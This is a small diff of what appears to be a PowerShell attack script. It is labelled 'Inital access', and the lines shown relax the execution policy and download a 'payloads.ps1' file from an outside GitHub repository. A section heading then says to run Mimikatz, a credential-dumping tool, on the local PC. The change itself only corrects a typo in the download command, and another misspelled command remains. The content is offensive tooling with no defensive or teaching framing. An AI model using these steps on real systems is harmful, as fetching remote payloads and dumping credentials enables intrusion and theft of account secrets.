@@ -1,7 +1,7 @@
 "Inital access"
 
 Set-Execition RemoteSigned
-Invoke-WebRequest -Uri "https://raw.githubusercontent.com/DolevAttiya/lol/main/payloads.ps1" -OutFildire "payloads.ps1"
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/DolevAttiya/lol/main/payloads.ps1" -OutFile "payloads.ps1"
 
 
 "Run Mimikatz on local PC"
